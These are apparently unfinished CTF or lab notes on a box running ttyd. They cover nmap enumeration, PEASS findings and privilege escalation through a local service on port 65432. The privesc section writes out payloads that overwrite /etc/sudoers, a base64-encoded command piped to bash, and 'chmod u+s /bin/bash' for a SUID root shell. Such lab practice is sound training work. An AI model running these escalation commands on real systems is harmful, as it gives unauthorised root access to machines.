#Pwned! 
```IP
192.168.133.210
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.133.210 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)            
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFR/u8yZrrxkDWw/8gy/fNFksvT+QIL8O/6eD8zVxwKwgBURa9uRtOC8Dk6P+ktLwXJ9oSUitZeXVWjijbehpZBVHvywEOj9nc0bmk0+M/DGGbr1etS7cDvRzRATUtMPxQfYhzXqHlZe6Q2GfA0c75uybUXxOha8CTdK0Iv/maUUaiaPv3LGebQ4CpNaXNQfYVp
CdsxLn5MxFi+tfenn/4CinBPn1Ahnx499V1G0ANTaKLsEETjqaMd5jnmml2wH1GmKfKf/6FevWv0Q9Ylsi3x/ipkDpcQAMRQ/aw5NuSSDrGTdo0wRuuoEf5Ybenp9haPVxUAPHbEcMI2hdcP5B3Cd03qimMhHEkFXE8sTUxRKHG+hg7cF8On1EXZsH1fsVyrFAAoHRrap5CsubmNXT93EcK7lc65DbKgeqls643x0p/
4WOUiLXFstm6X4JCdEyhvWmnYtL3qDKMuQbCwrCJGeDjoaZTjHXbpjSxSnvtO04RT84x2t8MThyeYO3kSyM=
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)           
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBWjceIJ9NSOLk8zk68zCychWoLxrcrsuJYy2C1pvpfOhVBrr8QBhYbJxzzGJ7DpuMT/DXiCwuLXdu0zeR4/Dk=
|   256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)         
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG3LJwn9us7wxvkL0E6EEgOPG3P0fa0fRVuJuXeASZvs
8000/tcp open  http-alt syn-ack ttl 61 ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)

```
## HTTP 80
ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)

# Exploitation

# PrivEsc

## Manual

## Automated

### Peass
linux exploits
pwnkit not working
[CVE-2021-3156] sudo Baron Samedit
[CVE-2021-3156] sudo Baron Samedit 2

active ports
```
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                          
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                                                                                          
tcp        0      0 127.0.0.1:65432         0.0.0.0:*               LISTEN      -                                    
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN                                
tcp6       0      0 :::22                   :::*                    LISTEN      -
```
.sh files in path
```
/usr/bin/gettext.sh                                                                     
/usr/bin/rescan-scsi-bus.sh
```

Searching for port 65432 we get an exploit.
Modifying the payload to ping our attacking machine will succeed. We will se some hexadecimal output nonetheless. 

```
ping -c 5 192.168.45.194
```
Unfortunately, the following payload to add our user to sudo will fail
```
echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers
```
```
echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241201175406.png?raw=true)
encoding our payload in base64 doesnt work either
```
echo 'ZWNobyDigJx1c2VyIEFMTD0ocm9vdCkgTk9QQVNTV0Q6IEFMTOKAnSA+IC9ldGMvc3Vkb2Vycwo=' | base64 -d | bash
```
the following payload works fine:
```
chmod u+s /bin/bash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241201180145.png?raw=true)
### Mimikatz

# Lateral Movement

